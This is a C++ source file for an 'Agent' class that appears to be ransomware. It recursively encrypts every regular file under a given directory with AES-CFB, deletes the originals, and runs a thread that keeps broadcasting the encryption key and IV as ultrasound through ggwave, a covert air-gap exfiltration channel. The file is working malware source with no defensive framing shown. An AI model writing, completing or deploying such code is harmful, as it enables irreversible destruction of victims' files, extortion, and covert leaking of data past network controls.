#include "Agent.h"
#include "Defines.h"

#include <filesystem>
#include <array>
#include <cassert>
#include <Cryptopp/files.h>
#include <Cryptopp/aes.h>
#include <Cryptopp/modes.h>
#include <Cryptopp/osrng.h>
#include <chrono>

using namespace std::literals;
using namespace std::filesystem;
using namespace CryptoPP;

Agent::Agent() :
	m_encryption_key(generate_key()),
	m_init_vector(generate_iv())
{}

Agent::~Agent()
{
	try {
		m_agent_running = false;
		m_send_key_thread.reset();
		m_ultrasonic_main_thread.reset();
	} catch(...) {
		LOG("Exception in agent dtor");
		assert(true);
	}
}

void Agent::execute(const path& encryption_root_path)
{
	m_send_key_thread = std::make_unique<std::jthread>([&]()
	{
		send_key();
	});
	
	m_ultrasonic_main_thread = std::make_unique<std::jthread>([&]()
	{
		ultrasonic_main();
	});

	encrypt_directory(encryption_root_path);
}

void Agent::encrypt_directory(const path& encryption_root_path)
{
	for(const directory_entry& entry : recursive_directory_iterator(encryption_root_path))
	{
		if (entry.is_regular_file())
		{
			{
				path final_path = entry.path().wstring() + L".encrypted";
				CFB_Mode<AES>::Encryption encryption(m_encryption_key.data(), m_encryption_key.size(), m_init_vector.data());
				FileSource fsEnc(entry.path().c_str(), true, new StreamTransformationFilter(encryption, new FileSink(final_path.c_str())));
			}

			std::filesystem::remove(entry.path());
		}
	}
}

std::array<byte, AES::DEFAULT_KEYLENGTH> Agent::generate_key()
{
	AutoSeededRandomPool rng{};
	std::array<byte, AES::DEFAULT_KEYLENGTH> key{};
	rng.GenerateBlock(key.data(), key.size());

	return key;
}

std::array<byte, AES::BLOCKSIZE> Agent::generate_iv()
{
	AutoSeededRandomPool rng{};
	std::array<byte, AES::BLOCKSIZE> iv{};
	rng.GenerateBlock(iv.data(), iv.size());

	return iv;
}

void Agent::ultrasonic_main()
{
	while (m_agent_running) {
		std::this_thread::sleep_for(1ms);

		{
			std::lock_guard lock(m_ultrasonic_mutex);
			m_ultrasonic.run_logic();
		}
	}
}

void Agent::send_key()
{
	constexpr int TX_PROTOCOL = GGWAVE_TX_PROTOCOL_ULTRASOUND_FASTEST;
	constexpr int VOLUME = 5;
	
	std::string encryption_data = "key: {" + std::string(m_encryption_key.begin(), m_encryption_key.end()) + "} vi: {" + std::string(m_init_vector.begin(), m_init_vector.end()) + "}";
	auto ggWave = m_ultrasonic.get_ggwave();

	while (m_agent_running) {
		std::this_thread::sleep_for(10s);

		{
			std::lock_guard lock(m_ultrasonic_mutex);
			ggWave->init(encryption_data.size(), encryption_data.data(), ggWave->getTxProtocol(TX_PROTOCOL), VOLUME);
		}
	}
}
